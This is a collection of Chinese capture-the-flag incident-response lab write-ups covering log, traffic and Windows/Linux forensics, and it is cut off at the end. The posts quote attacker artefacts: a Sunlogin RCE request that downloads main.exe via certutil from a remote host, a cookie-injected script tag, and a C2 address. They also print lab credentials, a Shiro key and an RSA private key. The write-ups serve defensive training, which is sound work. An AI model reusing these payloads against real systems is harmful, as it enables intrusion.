[{"content":"简介 靶机来源 @vulntarget\n靶机可以采集本地搭建或者是云端调度\n搭建链接 https://github.com/crow821/vulntarget\nssh root@ip 密码xjnacos 启动 /var/local/下的 autorun.sh即可正常启动\n问题 1 nacos 用户密码的密文值作为 flag 提交 flag{密文}\n问题 2 shiro 的key为多少 shiro 的 key 请记录下来 （备注请记录下，可能有用）\n问题 3 靶机内核版本为 flag{}\n问题 4 尝试应急分析，运行 get_flag 然后尝试 check_flag 通过后提交 flag\n问题 5 尝试修复 nacos 并且自行用 poc 测试是否成功\nflag1 nacos 用户密码的密文值作为 flag 提交 flag{密文}\n根据题目描述，连接ssh后需在/var/local下运行autorun.sh以启动nacos服务。\n在/var/local目录下存在nacos目录，在nacos/conf/目录下发现nacos-mysql.sql,从中发 现了加密的nacos密码\n使用命令：\n1 2 3 cd nacos/conf //目录下 查看数据库中的pass关键字： cat nacos-mysql.sql | grep pass 1 flag{$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu} flag2 shiro 的key为多少 shiro 的 key 请记录下来 （请记录下来，会有用d）\n在nacos目录下存在一个nacos_config_xxx的zip文件，下载到本地后解压后DEFAULT_GROUP文件下存在三个文件 ADMIN_API、ADMIN_CONFIG、GATEWAY。在ADMIN_CONFIG中发现shiro配置\n1 其中key为 KduO0i+zUIMcNNJnsZwU9Q== 找到这个文件夹下的这个文件：\n1 nacos-server-2.0.1\\nacos\\nacos_config_export_20231206050259\\DEFAULT_GROUP 打开找到权限认证的key值：\n1 KduO0i+zUIMcNNJnsZwU9Q== 1 flag{KduO0i+zUIMcNNJnsZwU9Q==} flag3 靶机内核版本为 flag{}\n1 2 root@vulntarget:/var/local/nacos# uname -a Linux vulntarget 5.4.0-164-generic #181-Ubuntu SMP Fri Sep 1 13:41:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 1 flag{5.4.0-164-generic} flag4 尝试修复 nacos 并且自行用 poc 测试是否成功 此题无flag\n尝试应急分析，运行get_flag然后尝试check_flag通过后提交flag\n找一下get-flag和check_flag\n1 2 3 4 5 6 7 root@vulntarget:/var/local# find / -name get_flag /home/vulntarget/get_flag root@vulntarget:/var/local# root@vulntarget:/var/local# find / -name check_flag /home/vulntarget/check_flag root@vulntarget:/var/local# 然后运行一下看一下，这里的flag需要应急响应成功后刷新的flag才是正确的\n1 cat /etc/passwd 由于存在后门用户，这里我们需要删除这个用户即可：\n使用命令；\n1 userdel -f bt 删除bt用户，这里使用的是强制删除\n删除用户后\n要删除bt用户之后再去执行文件\n这里的文件删除rm -rf 这一行\n保存文件后，去执行之前的文件\n尝试修复nacos并且自行用poc测试是否成功\n这里找不到网站，网上看了大牛的wp，使用扫描器扫出来了\n1、弱口令 2、未授权 3、SQL注入 4、认证绕过\n1 2 pyc反编译 https://www.lddgo.net/string/pyc-compile-decompile ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/47.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java01-nacos/","title":"【玄机靶场】第八章 内存马分析-java01-nacos"},{"content":"简介 账号密码\n1 2 root apacherizhi ssh root@IP 1、提交当天访问次数最多的IP，即黑客IP：\n2、黑客使用的浏览器指纹是什么，提交指纹的md5：\n3、查看包含index.php页面被访问的次数，提交次数：\n4、查看黑客IP访问了多少次，提交次数：\n5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:\n常见日志文件位置\nApache日志\n1 2 3 4 5 6 访问日志：默认位置通常是 /var/log/apache2/access.log.1（Debian/Ubuntu） /var/log/httpd/access_log.1（CentOS/RHEL）。 错误日志：默认位置通常是 /var/log/apache2/error.log.1（Debian/Ubuntu） /var/log/httpd/error_log.1（CentOS/RHEL）。 SSH日志\n1 2 3 身份验证日志：通常位于 /var/log/auth.log（Debian/Ubuntu） /var/log/secure（CentOS/RHEL）。 系统日志\n1 2 3 系统日志：通常位于 /var/log/syslog（Debian/Ubuntu） /var/log/messages（CentOS/RHEL）。 flag1 1、提交当天访问次数最多的IP，即黑客IP：\n使用命令：\n1 cut -d- -f 1 access.log.1|uniq -c | sort -rn | head -20 1 flag{192.168.200.2} flag2 2、黑客使用的浏览器指纹是什么，提交指纹的md5：\n思路是什么，现在我们知道黑客的ip了啊，日志位置我们也知道了啊，直接筛选一波黑客ip不就行了；\n命令：\n1 cat access.log.1 |grep 192.168.200.2 |more 得到浏览器指纹\n1 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 加密如下：\n1 flag{2D6330F380F44AC20F3A02EED0958F66} flag3 3、查看包含index.php页面被访问的次数，提交次数：\n1 2 3 cat access.log.1 | grep \u0026#34;/index.php\u0026#34; | wc -l `wc -l` 命令用于统计行数，即访问次数。 1 flag{27} 发现不对，然后看一下日志：\n1 cat access.log.1 | grep \u0026#34;/index.php\u0026#34; 最后发现了有两个返回200其他都是404，尝试了flag{2}也不对，在改为25的时候对了。\n1 flag{25} flag4 4、查看黑客IP访问了多少次，提交次数：\n这里给出三个命令，都是可以查到的：\n1 2 3 4 5 cat access.log.1 | grep \u0026#34;192.168.200.2 - -\u0026#34; | wc -l cat access.log.1 | grep \u0026#34;192.168.200.2\u0026#34; | cut -d\u0026#39; \u0026#39; -f1 | sort | uniq -c grep \u0026#34;192.168.200.2\u0026#34; access.log.1 | cut -d\u0026#39; \u0026#39; -f1 | sort | uniq -c 1 flag{6555} flag5 5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:\n三条命令如下：\n1 2 3 4 5 cat access.log.1 | grep \u0026#34;03/Aug/2023:08:\u0026#34; | awk \u0026#39;{print $1}\u0026#39; | sort -nr| uniq -c |wc -l grep \u0026#34;03/Aug/2023:08:\u0026#34; access.log.1 | awk \u0026#39;{print $1}\u0026#39; | sort -nr | uniq -c | wc -l cat access.log.1 | grep \u0026#34;03/Aug/2023:08:\u0026#34; | awk \u0026#39;{print $1}\u0026#39; | sort -nr| uniq -c 1 flag{5} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/44.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","title":"【玄机靶场】第二章 日志分析- apache日志分析"},{"content":"flag1 下载数据包文件 hacker1.pacapng，分析恶意程序访问了内嵌 URL 获取了 zip 压缩包，该 URL 是什么将该 URL作为 FLAG 提交 FLAG（形式：flag{xxxx.co.xxxx/w0ks//?YO=xxxxxxx}） (无需 http、https)；\n搜索一下http协议，并且返回200的流量包，发现只有两个，然后打开第一个发现一个完整的url\n1 http contains \u0026#34;200\u0026#34; 1 flag{tsdandassociates.co.sz/w0ks//?YO=1702920835} flag2 下载数据包文件 hacker1.pacapng，分析获取到的 zip 压缩包的 MD5 是什么 作为 FLAG 提交 FLAG（形式：flag{md5}）；\n打开第二个流量包：\n导出zip格式文件\n放HashClac里进行分析\n得出MD5值\n1 f17dc5b1c30c512137e62993d1df9b2f 1 flag{f17dc5b1c30c512137e62993d1df9b2f} flag3 下载数据包文件 hacker1.pacapng，分析 zip 压缩包通过加载其中的 javascript 文件到另一个域名下载后续恶意程序， 该域名是什么?提交答案:flag{域名}(无需 http、https)\n这个需要对js文件解码\n1 flag{shakyastatuestrade.com} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/48.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/","title":"【玄机靶场】第六章 流量特征分析-小王公司收到的钓鱼邮件"},{"content":"题目思路 题目没有给出提示，但根据标题命名得知分析的是蚁剑流量包，所以我们可以直接查看http数据包进行分析。通过对统计数据的分析，我们可以得到http数据大致的访问信息，再通过查询语句过滤流量包得到成功访问的流量包\n下载数据包 flag1 木马的连接密码是多少\n1、左键点击“统计”-\u0026gt;“HTTP”-\u0026gt;“分组计数器”查看分析HTTP流量数据\n2、http contains \u0026ldquo;200\u0026rdquo; 查看http协议中包含200（成功登录返回值）的流量包\n1 http contains \u0026#34;200\u0026#34; 3、右键其中一个请求包，点击“追踪流”-\u0026gt;“HTTP流”，进行查看分析，得到木马的连接密码是 \u0026ldquo;1\u0026rdquo;\nflag\n1 flag{1} flag2 黑客执行的第一个命令是什么\n题目思路：通过分析刚才语句过滤后的流量包，我们发现这些就是蚁剑连接执行命令的流量包，可以直接根据流量包顺序进行分析查看分析，解码后（根据编码特征发现是Base64编码）得到第一个命令执行语句\n1、查看第1个流量包中执行的命令信息\n2、右键编码“Value”位置，点击“分组字节流”，开始位置调整为“2”，解码为调整为“Base64”，查看流量包执行的命令内容，得到第一个执行的命令 \u0026ldquo;id\u0026rdquo;（查看当前用户uid）\n1 蚁剑会在编码前加两位随机生成的字符，所以需要调整开始位置 flag\n1 flag{id} flag3 黑客读取了哪个文件的内容，提交文件绝对路径?\n题目思路：根据之前的题目，我们已经找到了蚁剑连接的流量，以及执行的命令。继续对流量进行分析，查看流量包内容，得到读取的文件绝对路径\n1、依次查看请求流量包以及以及返回流量包，第三个返回包中回显了大量信息，猜测查看了文件内容（其实根据经验可以直接看出查看的是/etc/passwd文件）\n根据数据包来看，很明显是读取了passwd文件返回的内容。\n2、点击第3个请求包，右键编码“Value”位置，位置，点击“分组字节流”，开始位置调整为“2”，解码为调整为“Base64”，查看流量包执行的命令内容，得到黑客查看文件命令 \u0026ldquo;cat /etc/passwd\u0026rdquo;\nflag\n1 flag{/etc/passwd} flag4 黑客上传了什么文件到服务器，提交文件名?\n题目思路：根据之前做的分析，继续查看后面的流量包。通过分析回显流量包，发现第5个返回包与第2个返回包相比多了一个文件，由此可以得到文件名，当然我们也可以直接分析解码得到上传文件名\nflag\n1 flag{flag.txt} flag5 黑客上传的文件内容是什么?\n题目思路：我们在得到黑客上传的文件名后，通过查看返回包我们可以发现上传文件与执行系统命令的请求数据并不相同，只能查看请求数据包进行分析，通过对请求包数据的解码分析得到上传文件内容\n1、点击第4个请求包，右键“追踪流”-\u0026gt;“HTTP流”，将编码复制，进行解码\n2、首先进行URL解码（直接根据编码特征进行判断），查看后发现流量包后面有两段编码\n3、最后一段编码明显是Base64编码（解码后就是上传文件的绝对路径），猜测第二段编码为文件内容（蚁剑上传的文件会对内容进行16进制加密），进行解密得到文件内容 \u0026ldquo;flag{write_flag}\u0026rdquo;\n1 2 3 https://www.lddgo.net/string/hex 666C61677B77726974655F666C61677D0A flag\n1 flag{write_flag} flag6 黑客下载了哪个文件，提交文件绝对路径\n题目思路：这个与之前相同，直接查看流量包信息，解码后即可获得\n1、右键编码“Value”位置，位置，点击“分组字节流”，开始位置调整为“2”，解码为调整为“Base64”，查看流量包执行的命令内容，得到黑客下在的文件名 \u0026ldquo;config.php\u0026rdquo;\n1 flag{/var/www/html/config.php} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/49.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","title":"【玄机靶场】第六章 流量特征分析-蚁剑流量分析"},{"content":"简介 第四章 windows实战\nAdministrator xj@123456\nflag1 通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为多少,将黑客首次攻击成功的时间为作为 FLAG 提交(2028-03-26 08:11:25.123);\n1.获取向日葵日志文件：\n然后一个一个进行排查，发现sunlogin_service.20240321-191046文件内容比较多，拖出来进行分析：\n先排查一下日志文件中有多少IP地址,每个IP有多少条日志：\n1 grep -oE \u0026#39;\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\u0026#39; xrk.log | sort | uniq -c 1 2 3 4 5 6 7 8 9 10 2 0.0.0.0 2 1.1.1.1 4 127.0.0.1 2 127.1.1.1 594 192.168.31.114 1696 192.168.31.45 1 192.168.52.150 1651 47.111.107.239 1660 47.111.169.221 1 47.111.228.106 排除掉一些默认地址，然后一个IP一个IP进行查。\n发现192.168.31.45有很多恶意的访问路径。\n分析下来发现是尝试在利用CNVD-2022-10207：向日葵远程控制软件 RCE 漏洞。\nCNVD-2022-10207 漏洞是一种远程命令执行漏洞，存在于向日葵远程控制软件中。攻击者可以通过特制的 HTTP 请求利用此漏洞，执行任意命令或代码。\n1 grep \u0026#34;192.168.31.45\u0026#34; xrk.log 提取时间：\nflag\n1 flag{2024-03-26 10:16:25.585} flag2 通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;\n根据flag1,可以看出黑客IP为：192.168.31.45\nflag\n1 flag{192.168.31.45} flag3 通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;\n根据日志信息，可以看出：\n1 192.168.31.45:49329,/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe certutil -urlcache -split -f http://192.168.31.249/main.exe, plugin:check, session:sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1 恶意活动指示： 路径遍历：/check?cmd=ping.... 是一种路径遍历尝试，试图访问系统中的powershell.exe。 命令执行：使用 certutil 工具下载文件 main.exe。 外部IP：下载源 http://192.168.31.249/main.exe 指向一个可能托管恶意程序的外部服务器。 恶意程序下载： 工具使用：certutil 是一个合法的Windows工具，但在这里被用于下载恶意文件，这是一个常见的攻击模式。 下载目标：目标文件 main.exe 可能是恶意程序。\nflag 1 flag{192.168.31.249} flag4 找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;\n从日志里找一下DEC，看有没有信息\n但并没有找到这个文件信息。但是我们看日志，发现一个qq.txt文件。\n1 2024-03-26 10:39:11.031 - Info - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49884, path: /check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe echo 647224830 \u0026gt; qq.txt, version: HTTP/1.1 搜索QQ群，发现了玄机的靶场群。\n找到文件：\n使用命令，对文件进行MD5加密\n1 md5sum DEC.pem flag\n1 flag{5ad8d202f80202f6d31e077fc9b0fc6b} flag5 通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;\n先使用RSA解到密钥：\nFlag4的DEC.pem文件就是rsa的私钥，不过格式需要稍加修改，将Private key改成大写即可\nPEM格式密钥：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 -----BEGIN RSA PRIVATE KEY----- MIICXQIBAAKBgQDWQqpkHRKtRu66MjTrNZC13A6rIlGaJBd/FYBy4ifiITasCnQE J9aRTIYQsM5iincecnvY8xGYMg5pVTp6P4fxS4/+1bAEciRXSTCmLI8FeDd3sjOc HTw82sG0hfnnb0b/LFhbOCk7BgLnpwvSy5za/dtVQFSDbQbQuTBp029AKwIDAQAB AoGBAKh6952NtvgGhQZpIG+sSUSX6/jqHZzFsKw/7idoatBIKcOS3LO/19udfvZ0 8XVPSGfqwjRQvo8dHXP6juc+Odg1XOLPw4fjjJz9b9dLKCKwtIU3CwA1AmuhYNGp 1OXlHLyUaNVTN3TZN9Dn7txD4gOvLIirqbmhzy/N7PdPF5ThAkEA4MB++5DSY7Kv MO1uHuxTr/jRy6754Mzgo0fpLBXSB13/nLMxRA6QEbigoAFpsFd36EYMKzftbezB gx2nphvLUwJBAPQMv730MqCWjaCPLgYRV+oMU6OnOMs6+ALql+I1eVqVfBAt+5De HMxY7mWdaR9pofzuz+6KkmwRHqKSVw45dMkCQFJ68l76B+vkoFxxVe9tRU0YIE4C mdtA9NOXSWAPZfOkMHFeZZ8XRRHr0q7FtfasMuoAAuk9bhngQCgREvxnyNcCQGnt trQecHMfpe2Q+CsOEBi4rP0VsiMUP14UsUQwbbIRvD3Rl6WzotBXsXJNtrk5wmPk zD//ybo6XA+4cSztZ3ECQQC92ck1XJm7V12SOFqHcNXFoS8tFvgNQXNEahmhJ2wb xTo0VwUhCeG1n8X5PqRn6Rcsh8YQAt924YrWtcTxrg8g -----END RSA PRIVATE KEY----- 要加密的内容\n1 N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w= 解密：\n1 NXVJSTQUAPGTXKSX 然后再AES解密：\n需要解密的内容：\n1 0sWK8adKSGh1Xaxo6n1mZFoyNDYVokXwkBhxnzxU+MEJIV44u48SdOiFzWLn849hObaP6z26lLtMnXaDUnAPuMh+nF2hw9RoAsur7KYxE8/iY/y4jOEBsHT5wvQldcNfntrDyMUCvrWTUHl2yapUmaIIf2rZsNsqMVJ9puZzp58+FJmulyC7R1C2yoP1jHhsdOkU7htbzUWWsm2ybL+eVpXTFC+i6nuEBoAYhv2kjSgL8qKBFsLKmKQSn/ILRPaRYDFP/srEQzF7Y4yZa4cotpFTdGUVU547Eib/EaNuhTyzgOGKjXl2UYxHM/v0c3lgjO7GDA9eF3a/BBXPAgtK126lUfoGK7iSAhduRt5sRP4= 密钥：\n1 NXVJSTQUAPGTXKSX iv偏移量是16个0\n获得答案：\n1 2 3 4 5 6 @suanve 时间是连续的，年份只是人类虚构出来用于统计的单位，2024年第一天和2023年最后一天， 不会有任何本质区别。你的花呗，你的客户,你的体检报告，窗外的寒风，都不会因为这是新的一年， 而停下对你的毒打。 GIVE YOU FLAG!!!!! flag{EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1} flag\n1 flag{EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/40.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-%E5%90%91%E6%97%A5%E8%91%B5/","title":"【玄机靶场】第四章 windows 实战-向日葵"},{"content":"简介 服务器场景操作系统 Windows7\n服务器账号密码：winlog/winlog123\n连接端口为：ip:3389\n按照题目提示可以根据系统功能分析，或桌面工具进行辅助分析\n注意：远控软件内IP为虚拟IP，如在进行进程中没有找到相关外连，应该是由于连接超时造成的断开了，重启环境服务器或软件即可继续对外发起请求，请见谅\n注意：题目中shell如需在本地分析，提前关闭杀毒软件，会被杀掉，非免杀\n注意：winlog用户在操作关于系统权限功能时，一定要使用管理员权限打开工具再去执行\n如：cmd直接打开则可能无法进行操作系统权限性操作，需右击cmd-使用管理员权限打开，才可以，其它工具也如此\n题目描述 某台Windows服务器遭到攻击者入侵，管理员查看发现存在大量rdp爆破的请求，攻击者使用了不同位置的IP(此处模拟)，进行爆破并成功，并成功进入了系统，进入系统后又做了其它危害性操作，请根据各题目完成填写\n题目来源公众号 州弟学安全\n1 文档：https://mp.weixin.qq.com/s/eJpsOeaEczcPE-uipP7vCQ 靶场开启 步骤 flag1 审计桌面的logs日志，定位所有扫描IP，并提交扫描次数\n直接把access.log文件拉出来，放kali中或者任意linux系统中查一下即可。 1 awk \u0026#39;{print $1}\u0026#39; access.log | sort | uniq -c | sort flag:\n1 flag{6385} flag2 审计相关日志，提交rdp被爆破失败次数\nWin+R打开，eventvwr.msc\n打开日志：\n然后根据要求进行筛选，事件ID为4625，可以看到登录失败次数为2594次\n登录失败日志ID为4625\n也可以使用工具进行查看\nflag 1 flag{2594} flag3 审计相关日志，提交成功登录rdp的远程IP地址，多个以\u0026amp;连接,以从小到大顺序排序提交\n事件ID筛选为4648，表示用使用凭据登录\n然后到处文件，放FullEventLogView软件中\n找到一个192.168.150.1\n第二个：192.168.150.128\n第三个：192.168.150.178\nflag: 1 flag{192.168.150.1\u0026amp;192.168.150.128\u0026amp;192.168.150.178} flag4 提交黑客创建的隐藏账号\n关于隐藏账号在用户组中可以查看到，快捷键WIN+R输入 \u0026lsquo;lusrmgr.msc\u0026rsquo;，看到用户中hacker$以及属性及所属的组\n1 flag{hacker$} flag5 提交黑客创建的影子账号\n影子账号真实环境中是无法在用户组/netuser/用户面板中看到，但是可以在注册表中看到并删除，快捷键WIN+R \u0026lsquo;regedit\u0026rsquo; 1 注册表地址：HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names 下图为hackers$对应的权限值/组信息/映射关系及用户相关目录，操作删除后将不存在此用户信息\n或者直接使用D盾即可\nflag\n1 flag{hackers$} flag6 提交远程shell程序的连接IP+端口，以IP:port方式提交\n在应急响应中应排查对外连接，这一步是必不可少的，使用netstat -nao查看到相应的端口状态，在后面看到可疑连接\n由内对外连接，可拿着这个IP去查询到地区为国外的IP，如果说你没看到这个对外连接，说明连接超时了，因为对方本身就没开放这个端口，可重启环境后再次查看到，本身就为了模拟哈\n玄机包括实战中可看到不少的对外连接，这时候怎么排查呢，以玄机为例\n可看到对外连接不少的互联网IP，排查思路如下 1 2 3 1. 根据外联IP地址进行排查，在情报平台进行查询 2. 根据端口进行排查，通常大端口或有特殊意义端口要确认 3. 依次根据PID进行排查，这个下面会讲到 flag:\n1 flag{185.117.118.21:4444} flag7 各位应该发现了，开机就外联了，这个时候我们应该联想到自启动，一般排查以下\n1 2 3 4 5 1. C:\\Users\\winlog\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 快捷命令：WIN+R shell:startup 将预自启动程序放入目录，会自启 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 注册表自启动：快捷键：WIN+R regedit 将绝对路径下程序进行字符串值保存会开机自启 搜索计划任务，进入任务计划程序，查看相关启动程序 当然了，在排查这些之前，我们需要知道在跑的程序是哪个，已知PID为3676(注意：此处如果突然没有外连，则是超时，需重启环境，这个没办法，不能做到真上线)\n1 tasklist | findstr \u0026#34;3676\u0026#34; 使用以上命令查看到启动的文件为xiaowei.exe，但是不知道绝对路径如何处置\n通过以上命令可获取PID的执行文件绝对路径，看到目录在\n1 wmic process get name,executablepath,processid | findstr 3676 这里不知道为什么恶意软件断了，PID也变了，打的时候换成自己查到的PID即可\n绝对路径为：\n1 C:\\Windows\\system64\\systemWo\\xiaowei.exe 当然了，我们也可以使用 netstat -naob查看进程的启动程序和端口，记得用管理员CMD才行。\n但是如需查看绝对路径的话还是按照上方方法，这里只是提供多一个方法排查参考\n此时，我们继续按照上面思路排查自启动问题，看到自启动方法为注册表开机自启\n将xiaowei.exe文件拖出来，拿到ida或者微步沙箱去看一下，明显的木马特征和Cobalt特征\n包括到最后面的网络行为特征也能看到外联IP地址、\nflag\n1 flag{xiaowei.exe} flag8 黑客使用了计划任务来定时执行某shell程序，提交此程序名字\n上面已经说了关于计划任务的一些排查思路，按照实战中，攻击队或黑客为了权限维持，不会只放一个远控工具，一般会埋雷进行启动计划任务，根据上方思路排查到，计划任务程序中存在的计划\n使用compmgmt.msc打开计算机管理\n然后查看任务计划程序\n可以看出触发时间\n点进去查看执行的程序，可看到执行绝对路径\n查看这个bat脚本，最后得到执行全过程，确认下载了xiaowei.exe文件到相关目录，最后每次开机自启xiaowei.exe文件上线\nflag: 1 flag{download.bat} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/39.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","title":"【玄机靶场】第四章-windows日志分析"},{"content":"简介 服务器场景操作系统 Linux\n服务器账号密码 root xjty110pora 端口 2222\n任务环境说明\n注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！\n应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查\nflag1 找到黑链添加在哪个文件 flag 格式 flag{xxx.xxx}\n1 /var/www/html 文件拉出来分析：\n1 flag{header.php} flag2 webshell的绝对路径 flag{xxxx/xxx/xxx/xxx/}\n直接使用D盾进行扫描即可！\n扫描出来一个一个分析一下。发现404.php为后门文件。\n1 flag{/var/www/html/usr/themes/default/404.php} flag3 黑客注入黑链文件的 md5 md5sum file flag{md5}\nD盾扫描出来的pool.js文件也很可疑\n确定poc1.js为黑链文件。\n1 PS D:\\html\u0026gt; certutil -hashfile .\\poc1.js MD5 1 flag{10c18029294fdec7b6ddab76d9367c14} flag4 攻击入口是哪里？url请求路径，最后面加/ flag{/xxxx.xxx/xxxx/x/}\n分析流量包\n在 Wireshark 的过滤器中输入 http 以过滤出所有 HTTP 请求和响应。这将使我们能够专注于与 Web 流量相关的数据包，当然这里也可以直接尝试定位文件“poc1.js”，因为题三我们已经找到了黑客注入的文件是“poc1.js”，所以我们可以尝试查找一下相关的数据包；\n1 http contains \u0026#34;poc1.js\u0026#34; 那我们右键追踪http进行分析；\n1 Cookie: 09f1f9758c26c309477b55f3a4bac8de__typecho_remember_url=http%3A%2F%2Fxxx.xxx.com%2F%22%3E%3C%2Fa%3E%3Cscript%2Fsrc%3Dhttp%3A%2F%2F192.168.20.130%2Fpoc.js%3E%3C%2Fscript%3E%3Ca%2Fhref%3D%22%23 这里的 Cookie 包含了一段注入的 JavaScript 代码，显然是黑链攻击的一部分。\nurl解码为：\n请求和响应中包含的信息表明http://192.168.20.130/index.php/archives/1/页面是黑链攻击的入口，通过Cookie注入的JavaScript代码引入了poc1.js文件，从而执行了恶意操作。这个URL是反弹的poc1.js的原因在于其作为恶意代码的载体和入口。\n1 flag{/index.php/archives/1/} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/45.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/","title":"【玄机靶场】第五章 linux实战-黑链"},{"content":"简介 点击下载附件获取附件\n任务环境说明\n注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！\n应急响应工程师在收到设备告警后，在受到攻击的服务器保存了一份log 请你协助分析 LOG 文件提交对应的 FLAG。\n靶场 三个日志文件进行分析：\n过程 flag1 1.将黑客成功登录系统所使用的IP地址作为Flag值提交；\n查看登录成功事件(ID:4624)\n点击筛选事件ID 4624即可；\nflag:\n1 flag{192.168.36.133} flag2 2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；\n事件 ID: 4738\n直接事件查看器即可查看\n1 flag{Adnimistartro} flag3 3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；\n筛选 事件 ID 4663\nflag:\n1 flag{SCHEMA} flag4 4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；\n直接进应用程序.evtx文件里找就行\nflag\n1 flag{7036} flag5 5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。\n题目说黑客登录系统后修改了登录用户并且进行了多次重启，提交黑客修改用户重启的次数，这里我们需要在系统日志里面进行查看，查看事件ID 1074；\nflag:\n1 flag{3} 事件ID: 事件 ID 4624 - 成功的账户登录\n事件 ID 4625 - 登录失败\n事件 ID 4634 - 用户注销\n事件 ID 4647 - 用户主动注销\n事件 ID 4720 - 用户账户已创建\n事件 ID 4722 - 用户账户已启用\n事件 ID 4725 - 用户账户已禁用\n事件 ID 4726 - 用户账户已删除\n事件 ID 4670 - 权限服务状态变更\n事件 ID 4719 - 系统审计策略已更改\n事件 ID 6005 - 事件日志服务启动\n事件 ID 6006 - 事件日志服务停止\n事件 ID 4672 - 特权服务已分配\n事件 ID 4673 - 特权服务已请求\n事件 ID 7036 - 服务已更改状态\n事件 ID 1074 - 系统关机,重启或注销\n","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/46.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%94%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-evtx%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/","title":"【玄机靶场】第五章 Windows 实战-evtx文件分析"},{"content":"简介 1 2 账号root密码linuxrz ssh root@IP 1.有多少IP在爆破主机ssh的root帐号，如果有多个使用\u0026quot;,\u0026ldquo;分割\n2.ssh爆破成功登陆的IP是多少，如果有多个使用\u0026rdquo;,\u0026ldquo;分割\n3.爆破用户名字典是什么？如果有多个使用\u0026rdquo;,\u0026ldquo;分割\n4.登陆成功的IP共爆破了多少次\n5.黑客登陆主机后新建了一个后门用户，用户名是多少\n开启靶场 过程 flag1 1.有多少IP在爆破主机ssh的root帐号，如果有多个使用\u0026rdquo;,\u0026ldquo;分割\n首先肯定是先找到日志的位置，一般来说，SSH登录尝试会记录在 